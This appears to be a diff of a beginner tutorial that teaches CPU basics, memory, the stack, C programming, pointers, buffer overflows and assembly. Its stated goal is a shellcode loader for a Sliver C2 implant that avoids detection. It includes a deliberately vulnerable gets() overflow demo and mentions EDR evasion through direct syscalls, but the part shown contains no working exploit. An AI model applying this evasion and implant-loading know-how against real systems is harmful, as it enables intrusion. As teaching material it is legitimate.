+When the CPU runs a program, it has a special pointer called the **Instruction Pointer** (IP or RIP on 64-bit).
+
+This pointer says: "The next instruction is at this address."
+
+The CPU reads bytes from that address and treats them as code.
+
+If you can change where the instruction pointer points, you can make the CPU execute your own bytes as code.
+
+## Example: Data Becoming Code
+
+Imagine this memory:
+
+```
+Address:  1000   1001   1002   1003
+Data:    [0x48] [0x65] [0x6C] [0x6C]  = "Hell"
+```
+
+Normally, this is just the text "Hell".
+
+But if an attacker can make the instruction pointer point to address 1000, the CPU will try to execute these bytes as code.
+
+0x48 0x65 means something in x64 assembly. The CPU will run it.
+
+**This is the basic idea of shellcode.**
+
+We put bytes in memory (maybe disguised as data or input). Then we make the CPU execute those bytes.
+
+## Why This is Powerful
+
+If you give a program input, you are putting bytes in its memory.
+
+If you can also control the instruction pointer, those input bytes become code that runs.
+
+This is how many exploits work:
+1. Send special input (which is actually code in disguise)
+2. Trigger a bug that changes the instruction pointer
+3. The instruction pointer now points to your input
+4. Your input runs as code
+5. You have control
+
+## What is Shellcode Then?
+
+Shellcode is bytes that are designed to work as code.
+
+When you create a Sliver implant, Sliver gives you shellcode - a sequence of bytes.
+
+These bytes, when executed as code, will connect back to your C2 server.
+
+Your job is to:
+1. Get these bytes into the target's memory
+2. Make the CPU execute them
+3. Avoid detection while doing this
+
+---
+
+*End of Portion 2 - Chapters 4, 5, 6*
+
+*What you learned:*
+- *Numbers bigger than 255 use multiple bytes*
+- *Intel computers store bytes in little endian (backward) order*
+- *Text is stored as numbers using ASCII table*
+- *Strings end with null byte (0x00)*
+- *Same bytes can be data or code - it depends on how they are used*
+- *Shellcode is bytes designed to run as code*
+
+*Next portion: How programs actually run (CPU, memory, stack)*
+
+---
+
+# PART 2: HOW PROGRAMS RUN
+
+---
+
+# CHAPTER 7: What Does the CPU Do
+
+## Introduction
+
+The CPU (Central Processing Unit) is the brain of the computer.
+
+But what does it actually do?
+
+Very simple: **The CPU reads instructions and follows them. One by one.**
+
+That is it. Nothing more.
+
+## The Instruction Cycle
+
+The CPU does only 3 things, over and over, billions of times per second:
+
+1. **Fetch** - Get the next instruction from memory
+2. **Decode** - Understand what the instruction says to do
+3. **Execute** - Do what the instruction says
+
+Then repeat with the next instruction.
+
+## Example: Adding 5 + 3
+
+Let us see how the CPU adds 5 + 3.
+
+The instructions might be:
+1. Put the number 5 in register A
+2. Put the number 3 in register B
+3. Add register A and register B, put result in register A
+4. Done
+
+The CPU will:
+- **Fetch** instruction 1, **decode** it, **execute** it (now register A = 5)
+- **Fetch** instruction 2, **decode** it, **execute** it (now register B = 3)
+- **Fetch** instruction 3, **decode** it, **execute** it (now register A = 8)
+
+## What are Registers?
+
+Registers are tiny storage boxes **inside** the CPU itself.
+
+Memory (RAM) is far from the CPU. Reading from memory is slow.
+
+Registers are inside the CPU, so reading them is very fast.
+
+The CPU does most work using registers, not memory directly.
+
+**Important registers on x64 (64-bit Intel/AMD):**
+
+| Register | Common Use |
+|----------|------------|
+| RAX | General purpose, return values from functions |
+| RBX | General purpose |
+| RCX | Counter, 1st function parameter (Windows) |
+| RDX | 2nd function parameter (Windows) |
+| RSI | Source index |
+| RDI | Destination index |
+| RSP | Stack pointer (top of stack) |
+| RBP | Base pointer (bottom of stack frame) |
+| R8-R15 | Additional general purpose |
+| RIP | Instruction pointer (address of next instruction) |
+
+## The Most Important Register: RIP
+
+**RIP** (also called the instruction pointer) contains the address of the **next instruction** to execute.
+
+Every time the CPU finishes an instruction, it looks at RIP to know where the next instruction is.
+
+**This is critical for hacking.**
+
+If you can change RIP, you control what the CPU does next.
+
+When a buffer overflow overwrites a return address, it changes where RIP will point. The CPU then executes whatever is at that address - which could be your shellcode.
+
+## How Fast is the CPU?
+
+A modern CPU runs at about 3-4 GHz.
+
+1 GHz = 1,000,000,000 cycles per second.
+
+At 4 GHz, the CPU can do about 4 billion operations per second.
+
+This is why computers seem instant - they are doing billions of things between your keystrokes.
+
+---
+
+# CHAPTER 8: What is Memory
+
+## Introduction
+
+We talked about memory earlier (where bytes live). Now let us understand it better.
+
+## Memory is Just Numbered Boxes
+
+Imagine billions of boxes in a line. Each box:
+- Holds 1 byte (8 bits, value 0-255)
+- Has an address (which box number it is)
+
+```
+Address:  0     1     2     3     4     5     ...
+         [ ]   [ ]   [ ]   [ ]   [ ]   [ ]   ...
+```
+
+When we say "write to address 1000", we put a byte in box number 1000.
+
+When we say "read from address 1000", we look at what is in box number 1000.
+
+## How Big is Memory?
+
+On a 64-bit system, addresses can be up to 64 bits (0 to 2^64 - 1).
+
+But in practice, current CPUs use about 48 bits for addresses.
+
+2^48 = 281,474,976,710,656 bytes = 256 TB (terabytes)
+
+Your computer probably has 8-32 GB of RAM, which is much less. But the address space can be very large.
+
+## Memory Addresses in Different Sizes
+
+| Bits | Bytes | Max Address | Max Memory |
+|------|-------|-------------|------------|
+| 16 | 2 | 65,535 | 64 KB |
+| 32 | 4 | 4,294,967,295 | 4 GB |
+| 64 | 8 | Very big | 16 EB (theoretical) |
+
+On 32-bit Windows, programs could only use about 2 GB of memory. This is why 64-bit systems are now standard.
+
+## Reading and Writing Memory
+
+The CPU can only do two things with memory:
+1. **Read** - Get the value at an address
+2. **Write** - Put a value at an address
+
+That is it. Everything else is built from these two operations.
+
+## Example: What Happens When You Run a Program
+
+Let us say you open notepad.exe:
+
+1. Windows reads notepad.exe from disk
+2. Windows allocates memory for notepad (let us say addresses 1000 to 50000)
+3. Windows copies notepad's code and data into that memory
+4. Windows sets RIP to the starting address (let us say 1000)
+5. CPU starts executing from address 1000
+6. Notepad runs
+
+When notepad closes, Windows frees that memory (addresses 1000-50000 become available again).
+
+---
+
+# CHAPTER 9: What is the Stack
+
+## Introduction
+
+When programs run, they need temporary storage. This is called the **stack**.
+
+## Why Do Programs Need a Stack?
+
+Think about this: You are running function A. Function A calls function B. Function B calls function C.
+
+When C finishes, you need to go back to B. When B finishes, you need to go back to A.
+
+How does the computer remember where to go back to?
+
+Answer: The stack.
+
+## How the Stack Works
+
+The stack is a region of memory that grows and shrinks.
+
+**Important rule:** Last in, first out (LIFO).
+
+Think of a stack of plates:
+- You put a plate on top (push)
+- You take a plate from top (pop)
+- You cannot take from the middle
+
+## Push and Pop
+
+**Push:** Add data to the top of the stack.
+
+**Pop:** Remove data from the top of the stack.
+
+## Example: Function Calls
+
+Let us trace what happens:
+
+```
+Function A runs.
+Function A calls Function B.
+    - PUSH the return address (where to go back in A)
+    - Jump to Function B
+Function B runs.
+Function B calls Function C.
+    - PUSH the return address (where to go back in B)
+    - Jump to Function C
+Function C runs.
+Function C finishes.
+    - POP the return address (address in B)
+    - Jump back to B
+Function B finishes.
+    - POP the return address (address in A)
+    - Jump back to A
+Function A continues.
+```
+
+The stack remembered the return addresses for us.
+
+## What Else is on the Stack?
+
+The stack stores:
+- **Return addresses** - Where to go back after function ends
+- **Local variables** - Variables created inside a function
+- **Function parameters** - Values passed to a function
+- **Saved registers** - Register values that need to be restored
+
+## Stack Direction
+
+On x86/x64, the stack grows **downward** (toward lower addresses).
+
+When you push, the stack pointer (RSP) goes down.
+When you pop, the stack pointer (RSP) goes up.
+
+```
+High Address
+-----------------
+| Old data      |
+-----------------
+| Return addr   |  ← Stack was here before call
+-----------------
+| Local vars    |  ← Stack is here now (lower address)
+-----------------
+Low Address
+```
+
+## Why the Stack is Important for Hacking
+
+**Buffer Overflow Attack:**
+
+If a local variable (like a buffer) is on the stack, and you write too much data into it, you can overwrite:
+- Other local variables
+- The saved return address
+
+If you overwrite the return address with your own address, when the function returns, it will jump to YOUR address instead of the real one.
+
+If your address points to shellcode, the shellcode runs.
+
+This is the classic stack buffer overflow.
+
+---
+
+# CHAPTER 10: User Mode and Kernel Mode
+
+## Introduction
+
+Not all code has the same power.
+
+The CPU can run in different modes. The two important ones are:
+- **User Mode** - Normal programs run here (limited power)
+- **Kernel Mode** - The operating system runs here (full power)
+
+## Why Two Modes?
+
+Imagine if any program could do anything:
+- Delete any file
+- Read any memory
+- Control hardware directly
+- Crash the whole computer
+
+That would be dangerous. A buggy or malicious program could destroy everything.
+
+So the CPU has restrictions.
+
+## User Mode
+
+When running in user mode:
+- Cannot access hardware directly
+- Cannot access other programs' memory (normally)
+- Cannot run certain CPU instructions
+- If something goes wrong, only that program crashes
+
+Normal programs (browsers, notepad, your game) run in user mode.
+
+## Kernel Mode
+
+When running in kernel mode:
+- Can access any memory
+- Can control hardware
+- Can run any instruction
+- If something goes wrong, the whole computer crashes (Blue Screen)
+
+The Windows kernel, drivers, and some security software run in kernel mode.
+
+## How Programs Ask for Help
+
+Since user mode programs cannot do many things directly, they ask the kernel to do it for them.
+
+This is called a **system call** (or syscall).
+
+**Example: Opening a file**
+
+1. Your program (user mode) wants to open a file
+2. Your program calls the Windows API function like CreateFile()
+3. CreateFile() makes a syscall to the kernel
+4. The kernel (kernel mode) actually opens the file
+5. The result is returned to your program
+
+## Why This Matters for Hacking
+
+**Security software often runs in kernel mode.** They can see everything.
+
+**Your shellcode runs in user mode.** It is limited.
+
+But most attacks happen in user mode. You can still do a lot:
+- Call Windows APIs
+- Create files
+- Make network connections
+- Run commands
+- Take screenshots
+
+For EDR evasion, we often try to avoid the APIs that are monitored. Or we call the kernel directly (direct syscalls).
+
+## User Mode to Kernel Mode Transition
+
+When you make a syscall:
+
+1. Your program is running in user mode
+2. You trigger a syscall (special instruction)
+3. CPU switches to kernel mode
+4. Kernel handles the request
+5. CPU switches back to user mode
+6. Your program continues
+
+The CPU has hardware support for this transition. It is fast and secure.
+
+---
+
+*End of Portion 3 - Chapters 7, 8, 9, 10*
+
+*What you learned:*
+- *CPU fetches, decodes, and executes instructions one by one*
+- *RIP register points to the next instruction*
+- *Memory is just numbered boxes that hold bytes*
+- *Stack is temporary storage, grows downward, last-in-first-out*
+- *User mode has limited power, kernel mode has full power*
+- *Programs use syscalls to ask the kernel for help*
+
+*Next portion: C Programming basics*
+
+---
+
+# PART 3: LEARNING C PROGRAMMING
+
+---
+
+# CHAPTER 11: Setting Up C on Windows
+
+## Introduction
+
+C is the programming language we will use to build our shellcode loader.
+
+Why C?
+- Windows is mostly written in C
+- We can talk to Windows directly with C
+- C gives us control over memory (which we need for shellcode)
+- Most offensive tools are written in C
+
+## What You Need
+
+We need a C compiler. A compiler takes your code and turns it into an .exe file.
+
+**Option 1: Visual Studio (Microsoft)**
+
+This is the best option for Windows.
+
+1. Download Visual Studio from: https://visualstudio.microsoft.com/
+2. Select "Community" edition (free)
+3. During install, select "Desktop development with C++"
+4. This includes the C compiler (cl.exe)
+
+**Option 2: MinGW (Simpler)**
+
+If Visual Studio is too big:
+
+1. Download MinGW from: https://www.mingw-w64.org/
+2. Install it
+3. This gives you gcc.exe (GNU C Compiler)
+
+For this guide, I will show both ways.
+
+## Your First C Program
+
+Create a file called `hello.c` with this content:
 
 ```c
 #include <stdio.h>
-#include <unistd.h>
 
 int main() {
-    int counter = 0;
-    while(1) {
-        counter++;
-        printf("Count: %d\n", counter);
-        sleep(2);
-    }
+    printf("Hello, I am learning C!\n");
     return 0;
 }
 ```
 
-Step 2 - Compile and run in background:
+## Compiling and Running
 
-```bash
-gcc loop.c -o loop
-./loop &
+**With Visual Studio:**
+
+Open "Developer Command Prompt for VS" and type:
+```
+cl hello.c
+hello.exe
 ```
 
-The `&` runs it in the background. You'll see output like:
+**With MinGW:**
 ```
-[1] 12847
-Count: 1
-```
-
-That `12847` is the **Process ID (PID)** - a unique number identifying this running program.
-
-Step 3 - See the process's memory map:
-
-```bash
-cat /proc/12847/maps
+gcc hello.c -o hello.exe
+hello.exe
 ```
 
-(Replace 12847 with your actual PID)
-
-**Output (partial):**
-
+You should see:
 ```
-55a4c8a00000-55a4c8a01000 r--p 00000000 08:01 1234567  /home/user/loop
-55a4c8a01000-55a4c8a02000 r-xp 00001000 08:01 1234567  /home/user/loop
-55a4c8a02000-55a4c8a03000 r--p 00002000 08:01 1234567  /home/user/loop
-7f8d4c000000-7f8d4c021000 rw-p 00000000 00:00 0 
-7ffd5c9e0000-7ffd5ca01000 rw-p 00000000 00:00 0        [stack]
+Hello, I am learning C!
 ```
 
-**What you're seeing:**
+Congratulations! You wrote and ran your first C program.
 
-| Address Range | Permissions | What it is |
-|---------------|-------------|------------|
-| `55a4c8a01000-55a4c8a02000` | `r-xp` | The program's CODE (readable, executable) |
-| `7ffd5c9e0000-7ffd5ca01000` | `rw-p` | The STACK (readable, writable) |
+## Understanding the Code
 
-The `r-xp` means:
-- `r` = readable
-- `x` = executable (CPU can run code here)
-- `p` = private (not shared)
-- `-` = not writable
+Let me explain each line:
 
-Step 4 - Kill the process:
+```c
+#include <stdio.h>
+```
+This line says "I want to use input/output functions". `printf` comes from here.
 
-```bash
-kill 12847
+```c
+int main() {
+```
+Every C program starts at `main()`. This is the entry point.
+
+```c
+    printf("Hello, I am learning C!\n");
+```
+This prints text to the screen. `\n` means new line.
+
+```c
+    return 0;
+```
+This tells Windows "the program finished successfully". 0 means success.
+
+```c
+}
+```
+This closes the main function.
+
+---
+
+# CHAPTER 12: What is a Variable
+
+## Introduction
+
+A variable is a named box in memory that holds a value.
+
+## Example: Age Checker Program
+
+Let us make a program that checks if someone can vote (age 18 or above).
+
+```c
+#include <stdio.h>
+
+int main() {
+    int age;           // Create a box called "age"
+    
+    age = 25;         // Put the number 25 in the box
+    
+    printf("Your age is: %d\n", age);
+    
+    if (age >= 18) {
+        printf("You can vote!\n");
+    } else {
+        printf("You cannot vote yet.\n");
+    }
+    
+    return 0;
+}
 ```
 
-### HANDS-ON EXERCISE 3: See Process Memory on Windows
+Output:
+```
+Your age is: 25
+You can vote!
+```
+
+## What Happened?
+
+```c
+int age;
+```
+This creates a box in memory. The box is named "age". The `int` means it holds whole numbers (integers).
+
+```c
+age = 25;
+```
+This puts the number 25 into the box.
+
+```c
+printf("Your age is: %d\n", age);
+```
+This prints the value inside the box. `%d` means "put a number here".
+
+## Common Variable Types
+
+| Type | What It Holds | Size | Range |
+|------|---------------|------|-------|
+| char | One character or small number | 1 byte | -128 to 127 |
+| int | Whole numbers | 4 bytes | -2 billion to +2 billion |
+| long | Bigger whole numbers | 8 bytes | Very big |
+| float | Decimal numbers | 4 bytes | Numbers with decimal point |
+
+## Example: Different Variable Types
+
+```c
+#include <stdio.h>
+
+int main() {
+    char letter = 'A';           // One character
+    int count = 100;             // Whole number
+    float price = 29.99;         // Decimal number
+    
+    printf("Letter: %c\n", letter);   // %c for character
+    printf("Count: %d\n", count);     // %d for integer
+    printf("Price: %.2f\n", price);   // %.2f for float with 2 decimals
+    
+    return 0;
+}
+```
+
+Output:
+```
+Letter: A
+Count: 100
+Price: 29.99
+```
+
+## Example: Simple Calculator
+
+```c
+#include <stdio.h>
+
+int main() {
+    int a = 10;
+    int b = 3;
+    
+    int sum = a + b;
+    int difference = a - b;
+    int product = a * b;
+    int quotient = a / b;
+    int remainder = a % b;   // % gives remainder
+    
+    printf("a = %d, b = %d\n", a, b);
+    printf("Sum: %d\n", sum);
+    printf("Difference: %d\n", difference);
+    printf("Product: %d\n", product);
+    printf("Quotient: %d\n", quotient);
+    printf("Remainder: %d\n", remainder);
+    
+    return 0;
+}
+```
+
+Output:
+```
+a = 10, b = 3
+Sum: 13
+Difference: 7
+Product: 30
+Quotient: 3
+Remainder: 1
+```
+
+## Where Do Variables Live in Memory?
+
+When you create a variable, it gets a memory address.
+
+```c
+#include <stdio.h>
+
+int main() {
+    int age = 25;
+    
+    printf("Value of age: %d\n", age);
+    printf("Address of age: %p\n", &age);  // & gives address
+    
+    return 0;
+}
+```
+
+Output (address will be different on your computer):
+```
+Value of age: 25
+Address of age: 0x7fff5c3a2abc
+```
+
+The `&age` gives the memory address where age is stored. This is a hexadecimal number!
+
+---
+
+# CHAPTER 13: What is a Pointer
+
+## Introduction
+
+This is the most important chapter for hacking. Pay close attention.
+
+A **pointer** is a variable that holds a **memory address**.
+
+Normal variables hold values (like 25).
+Pointers hold addresses (like 0x7fff5c3a2abc).
+
+## Why Pointers Matter
+
+With pointers, you can:
+- Access memory directly
+- Modify memory at any address
+- Pass large data without copying
+- Write shellcode loaders
+
+## Creating a Pointer
+
+```c
+#include <stdio.h>
+
+int main() {
+    int age = 25;       // Normal variable
+    int *ptr;           // Pointer variable (the * means pointer)
+    
+    ptr = &age;         // ptr now holds the ADDRESS of age
+    
+    printf("Value of age: %d\n", age);
+    printf("Address of age: %p\n", &age);
+    printf("Value of ptr: %p\n", ptr);        // Same as &age
+    printf("Value at ptr: %d\n", *ptr);       // *ptr reads the value
+    
+    return 0;
+}
+```
+
+Output:
+```
+Value of age: 25
+Address of age: 0x7fff5c3a2abc
+Value of ptr: 0x7fff5c3a2abc
+Value at ptr: 25
+```
+
+## Understanding the Symbols
+
+| Symbol | Meaning |
+|--------|---------|
+| `int age` | Normal variable holding an integer |
+| `int *ptr` | Pointer variable (holds an address) |
+| `&age` | "Address of" - gives the address of age |
+| `*ptr` | "Value at" - gives the value at the address ptr holds |
+
+## Example: Changing a Value Through a Pointer
+
+```c
+#include <stdio.h>
+
+int main() {
+    int age = 25;
+    int *ptr = &age;    // ptr points to age
+    
+    printf("Before: age = %d\n", age);
+    
+    *ptr = 30;          // Change the value at that address
+    
+    printf("After: age = %d\n", age);
+    
+    return 0;
+}
+```
+
+Output:
+```
+Before: age = 25
+After: age = 30
+```
+
+We changed `age` without using `age` directly. We changed it through the pointer.
+
+This is exactly what happens in shellcode injection - we write to memory addresses.
+
+## Example: Pointer to a Character (String)
+
+```c
+#include <stdio.h>
+
+int main() {
+    char *message = "Hello";
+    
+    printf("%s\n", message);           // Print whole string
+    printf("First letter: %c\n", *message);     // First character
+    printf("Second letter: %c\n", *(message+1));  // Second character
+    
+    return 0;
+}
+```
+
+Output:
+```
+Hello
+First letter: H
+Second letter: e
+```
+
+`message` points to the first character 'H'. To get 'e', we add 1 to the pointer.
+
+## Why This is Important for Shellcode
+
+When you have shellcode like:
+```c
+unsigned char shellcode[] = "\x48\x89\x5c\x24...";
+```
+
+`shellcode` is actually a pointer to the first byte. We can pass this pointer to Windows APIs to execute it.
+
+---
+
+# CHAPTER 14: What is a Function
+
+## Introduction
+
+A function is a block of code that does a specific job. You call it when you need that job done.
+
+## Example: Greeting Function
+
+```c
+#include <stdio.h>
+
+// This is a function
+void sayHello() {
+    printf("Hello!\n");
+}
+
+int main() {
+    sayHello();    // Call the function
+    sayHello();    // Call it again
+    sayHello();    // And again
+    
+    return 0;
+}
+```
+
+Output:
+```
+Hello!
+Hello!
+Hello!
+```
+
+We wrote the code once, but used it three times.
+
+## Function with Parameters
+
+Functions can receive values:
+
+```c
+#include <stdio.h>
+
+void greet(char *name) {
+    printf("Hello, %s!\n", name);
+}
+
+int main() {
+    greet("Vamsi");
+    greet("Krishna");
+    greet("Ravi");
+    
+    return 0;
+}
+```
+
+Output:
+```
+Hello, Vamsi!
+Hello, Krishna!
+Hello, Ravi!
+```
+
+## Function that Returns a Value
+
+```c
+#include <stdio.h>
+
+int add(int a, int b) {
+    int result = a + b;
+    return result;
+}
+
+int main() {
+    int sum = add(5, 3);
+    printf("5 + 3 = %d\n", sum);
+    
+    int another = add(100, 200);
+    printf("100 + 200 = %d\n", another);
+    
+    return 0;
+}
+```
+
+Output:
+```
+5 + 3 = 8
+100 + 200 = 300
+```
+
+## Example: Age Checker Function
+
+```c
+#include <stdio.h>
+
+int canVote(int age) {
+    if (age >= 18) {
+        return 1;    // 1 means yes
+    } else {
+        return 0;    // 0 means no
+    }
+}
+
+int main() {
+    int myAge = 25;
+    int friendAge = 16;
+    
+    if (canVote(myAge)) {
+        printf("I can vote!\n");
+    }
+    
+    if (canVote(friendAge)) {
+        printf("My friend can vote!\n");
+    } else {
+        printf("My friend cannot vote yet.\n");
+    }
+    
+    return 0;
+}
+```
+
+Output:
+```
+I can vote!
+My friend cannot vote yet.
+```
+
+## What Happens When You Call a Function?
+
+Remember the stack from Chapter 9?
+
+When you call a function:
+1. The return address is pushed to stack (where to come back)
+2. Function parameters are set up
+3. Function runs
+4. Function returns, return address is popped
+5. Execution continues from return address
+
+This is why buffer overflows are dangerous - they can overwrite the return address!
+
+---
+
+# CHAPTER 15: Arrays and Strings
+
+## Introduction
+
+What if you want to store many values? Use an array.
+
+An array is a list of values in a row.
+
+## Example: List of Numbers
+
+```c
+#include <stdio.h>
+
+int main() {
+    int scores[5];       // Array of 5 integers
+    
+    scores[0] = 90;      // First element (index 0)
+    scores[1] = 85;
+    scores[2] = 78;
+    scores[3] = 92;
+    scores[4] = 88;      // Last element (index 4)
+    
+    printf("First score: %d\n", scores[0]);
+    printf("Last score: %d\n", scores[4]);
+    
+    // Print all scores
+    for (int i = 0; i < 5; i++) {
+        printf("Score %d: %d\n", i, scores[i]);
+    }
+    
+    return 0;
+}
+```
+
+Output:
+```
+First score: 90
+Last score: 88
+Score 0: 90
+Score 1: 85
+Score 2: 78
+Score 3: 92
+Score 4: 88
+```
+
+## Important: Arrays Start at Index 0
+
+If you have 5 elements, the indexes are 0, 1, 2, 3, 4.
+
+NOT 1, 2, 3, 4, 5.
+
+This is a very common mistake for beginners.
+
+## Memory Layout of an Array
+
+In memory, array elements are next to each other:
+
+```
+Address:  1000    1004    1008    1012    1016
+          [90]    [85]    [78]    [92]    [88]
+          [0]     [1]     [2]     [3]     [4]
+```
+
+Each int is 4 bytes. So each element is 4 bytes apart.
+
+## What is a String?
+
+A string is an array of characters ending with a null byte (0).
+
+```c
+#include <stdio.h>
+
+int main() {
+    char name[10] = "Hello";
+    
+    // name contains: H, e, l, l, o, \0, ?, ?, ?, ?
+    // \0 is the null byte (value 0)
+    
+    printf("String: %s\n", name);
+    printf("First char: %c\n", name[0]);
+    printf("Second char: %c\n", name[1]);
+    
+    return 0;
+}
+```
+
+Output:
+```
+String: Hello
+First char: H
+Second char: e
+```
+
+## Memory Layout of "Hello"
+
+```
+Index:   0    1    2    3    4    5    6    7    8    9
+Value:   H    e    l    l    o   \0    ?    ?    ?    ?
+Hex:    48   65   6C   6C   6F   00    ??   ??   ??   ??
+```
+
+The \0 (null byte) tells functions like printf where the string ends.
+
+## Example: Changing a String
+
+```c
+#include <stdio.h>
+
+int main() {
+    char name[10] = "Hello";
+    
+    printf("Before: %s\n", name);
+    
+    name[0] = 'J';    // Change H to J
+    
+    printf("After: %s\n", name);
+    
+    return 0;
+}
+```
+
+Output:
+```
+Before: Hello
+After: Jello
+```
+
+---
+
+# CHAPTER 16: What is Buffer Overflow
+
+## Introduction
+
+This chapter is very important. It explains how many exploits work.
+
+## What is a Buffer?
+
+A buffer is just an array of bytes used to hold data.
+
+When a program says "enter your name", it creates a buffer to store your input.
+
+## The Problem
+
+What if your buffer is 10 characters, but you type 20 characters?
+
+```c
+#include <stdio.h>
+#include <string.h>
+
+int main() {
+    char password[8] = "secret";   // Password (should be secret)
+    char name[10];                  // Buffer for name
+    
+    printf("Password in memory: %s\n", password);
+    printf("Enter your name: ");
+    
+    gets(name);    // DANGEROUS! No limit on input
+    
+    printf("Hello, %s!\n", name);
+    printf("Password in memory: %s\n", password);
+    
+    return 0;
+}
+```
+
+## What Happens Normally?
+
+If you type "Vamsi" (5 characters):
+```
+Enter your name: Vamsi
+Hello, Vamsi!
+Password in memory: secret
+```
+
+Everything is fine.
+
+## What Happens With Long Input?
+
+If you type "AAAAAAAAAAAAAAAAAA" (18 A's):
+```
+Enter your name: AAAAAAAAAAAAAAAAAA
+Hello, AAAAAAAAAAAAAAAAAA!
+Password in memory: AAAAAAA
+```
+
+The password got overwritten! The extra A's went into the password variable.
+
+## Memory Layout Explanation
+
+Before input:
+```
+Address:  100-109      110-117
+Variable: name          password
+Value:    [empty]       [secret]
+```
+
+After typing 18 A's:
+```
+Address:  100-109      110-117
+Variable: name          password  
+Value:    [AAAAAAAAAA] [AAAAAAAA]
+          10 A's here   8 A's here (overflow!)
+```
+
+The name buffer overflowed into the password buffer.
+
+## The Real Danger: Overwriting Return Address
+
+Remember the stack from Chapter 9? Local variables are on the stack. The return address is also on the stack.
+
+If you overflow enough, you can overwrite the return address.
+
+```
+Stack (before overflow):
+-----------------------
+| Return Address      |  <- Points to caller
+-----------------------
+| Saved Base Pointer  |
+-----------------------
+| name[0-9]           |  <- Your buffer
+-----------------------
+
+Stack (after overflow):
+-----------------------
+| AAAAAAAAAAAAAAAA    |  <- Return address is now 0x41414141 (AAAA)!
+-----------------------
+| AAAAAAAA            |
+-----------------------
+| AAAAAAA...          |
+-----------------------
+```
+
+When the function returns, it tries to jump to 0x41414141 (which is "AAAA" in hex).
+
+If you put a real address there instead of AAAA, the program jumps to that address.
+
+If that address contains your shellcode... you win.
+
+## Why This is the Foundation of Many Exploits
+
+1. Find a buffer overflow vulnerability
+2. Overwrite the return address with address of your shellcode
+3. When function returns, it jumps to your shellcode
+4. Your shellcode runs
+5. You have control
+
+## Modern Protections
+
+Today, there are protections against this:
+- **Stack canaries** - Special values that detect overflow
+- **ASLR** - Randomizes addresses so you cannot predict them
+- **DEP/NX** - Makes stack non-executable (shellcode cannot run directly from stack)
+
+We will learn how to bypass these later. But you need to understand the basics first.
+
+---
+
+*End of Portion 4 - Chapters 11, 12, 13, 14, 15, 16*
+
+*What you learned:*
+- *How to set up C programming on Windows*
+- *Variables are named boxes in memory*
+- *Pointers hold memory addresses*
+- *Functions are reusable blocks of code*
+- *Arrays are lists of values in a row*
+- *Strings are character arrays ending with null byte*
+- *Buffer overflow happens when you write past the end of a buffer*
+- *Overwriting return address can give you code execution*
+
+*Next portion: How source code becomes an executable*
+
+---
+
+# PART 4: FROM SOURCE CODE TO EXECUTABLE
+
+---
+
+# CHAPTER 17: What is Compilation
+
+## Introduction
+
+You write code in C. The computer only understands bytes.
+
+How does your code become a running program?
+
+Answer: **Compilation**.
+
+## The Journey of Your Code
+
+```
+Your C Code (.c file)
+        ↓
+    Preprocessor (handles #include)
+        ↓
+    Compiler (turns C into assembly)
+        ↓
+    Assembler (turns assembly into machine code)
+        ↓
+    Linker (combines everything into .exe)
+        ↓
+Executable File (.exe)
+```
+
+## Let Us Watch It Happen!
+
+Create a file called `test.c`:
+
+```c
+#include <stdio.h>
+
+int main() {
+    int x = 5;
+    int y = 3;
+    int sum = x + y;
+    printf("Sum: %d\n", sum);
+    return 0;
+}
+```
+
+**Step 1: See the preprocessed output**
+
+```
+cl /E test.c > preprocessed.txt
+```
+
+Open `preprocessed.txt`. You will see THOUSANDS of lines! The `#include <stdio.h>` got replaced with the entire contents of stdio.h.
+
+**Step 2: See the assembly output**
+
+```
+cl /Fa test.c
+```
+
+This creates `test.asm`. Open it and you will see assembly code:
+
+```asm
+_main   PROC
+        push    ebp
+        mov     ebp, esp
+        sub     esp, 12
+        mov     DWORD PTR _x$[ebp], 5
+        mov     DWORD PTR _y$[ebp], 3
+        mov     eax, DWORD PTR _x$[ebp]
+        add     eax, DWORD PTR _y$[ebp]
+        mov     DWORD PTR _sum$[ebp], eax
+        ...
+```
+
+This is what your `int sum = x + y;` became!
+
+**Step 3: Create the final executable**
+
+```
+cl test.c
+```
+
+This creates `test.exe`. This is the final file Windows can run.
+
+## What Each Step Does
+
+| Step | Input | Output | What It Does |
+|------|-------|--------|--------------|
+| Preprocessor | .c file | Expanded .c | Replaces #include with file contents |
+| Compiler | Expanded .c | .asm (assembly) | Translates C to assembly language |
+| Assembler | .asm | .obj (object file) | Translates assembly to machine code |
+| Linker | .obj files | .exe | Combines code and resolves function addresses |
+
+## Why This Matters
+
+1. **Shellcode is machine code** - The final bytes that the CPU executes
+2. **Assembly helps you understand** - You can see exactly what instructions run
+3. **Object files** - When you compile parts separately, then link them
+4. **Symbols** - Function names and variable names exist until final linking
+
+---
+
+# CHAPTER 18: Assembly Language Fundamentals
+
+## Introduction
+
+Assembly is the human-readable form of machine code.
+
+Each line of assembly becomes a few bytes of machine code.
+
+## Why Learn Assembly?
+
+- To understand shellcode
+- To debug exploits
+- To reverse engineer malware
+- To write low-level code
+
+You do not need to become an expert. Just understand the basics.
+
+## Registers Refresh
+
+Remember from Chapter 7, registers are fast storage inside the CPU:
+
+| Register | Size | Common Use |
+|----------|------|------------|
+| RAX | 64-bit | Return values, general math |
+| RBX | 64-bit | General purpose |
+| RCX | 64-bit | Counter, 1st parameter (Windows) |
+| RDX | 64-bit | 2nd parameter (Windows) |
+| RSP | 64-bit | Stack pointer (top of stack) |
+| RBP | 64-bit | Base pointer |
+| RIP | 64-bit | Instruction pointer (next instruction) |
+| R8-R15 | 64-bit | Extra registers |
+
+**Smaller portions:**
+- RAX (64-bit) → EAX (lower 32-bit) → AX (lower 16-bit) → AL (lower 8-bit)
+
+## Basic Assembly Instructions
+
+**Moving data:**
+```asm
+mov rax, 5        ; Put 5 in RAX
+mov rbx, rax      ; Copy RAX to RBX (now RBX = 5)
+mov [rax], rbx    ; Write RBX to memory address in RAX
+mov rcx, [rax]    ; Read from memory address in RAX into RCX
+```
+
+**Math:**
+```asm
+add rax, 5        ; RAX = RAX + 5
+sub rax, 3        ; RAX = RAX - 3
+inc rax           ; RAX = RAX + 1
+dec rax           ; RAX = RAX - 1
+mul rbx           ; RAX = RAX * RBX
+```
+
+**Stack operations:**
+```asm
+push rax          ; Put RAX on stack, RSP goes down
+pop rbx           ; Take value from stack into RBX, RSP goes up
+```
+
+**Function calls:**
+```asm
+call myFunction   ; Push return address, jump to myFunction
+ret               ; Pop return address, jump there
+```
+
+**Comparisons and jumps:**
+```asm
+cmp rax, 5        ; Compare RAX with 5
+je  label1        ; Jump to label1 if equal
+jne label2        ; Jump to label2 if not equal
+jmp label3        ; Always jump to label3
+```
+
+## Example: Our C Code in Assembly
+
+This C code:
+```c
+int x = 5;
+int y = 3;
+int sum = x + y;
+```
+
